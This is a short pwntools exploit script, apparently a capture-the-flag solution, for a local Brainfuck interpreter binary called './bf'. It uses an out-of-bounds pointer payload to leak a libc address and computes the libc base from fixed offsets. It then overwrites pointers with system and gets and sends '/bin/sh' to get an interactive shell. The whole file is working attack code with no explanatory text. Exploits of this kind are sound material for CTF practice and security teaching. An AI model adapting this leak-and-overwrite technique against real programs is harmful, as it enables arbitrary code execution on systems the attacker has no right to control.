from pwn import *
import time

context.log_level = 'debug'

p = process("./bf")
system_offset = 0x3ada0
#write in sh

print p.recv()
print p.recv()
time.sleep(1)
payload = '<' * 124 + ".>.>.>.>" + "<<<<" * 6 + ",>,>,>,>" + ">>>>" * 6 + ",>,>,>,>" + ",>,>,>,>" + '.'

print payload
p.sendline(payload)

main_libc = int(u32(p.recv(4)))
libc_base = main_libc - 0x18540

system = libc_base + system_offset
fgets = libc_base + 0x5d540
gets = libc_base + 0x5f3e0

_start = 0x80484e0

p.send(p32(system) + p32(gets) + p32(_start))

raw_input()

p.sendline("/bin/sh\00")
p.interactive()
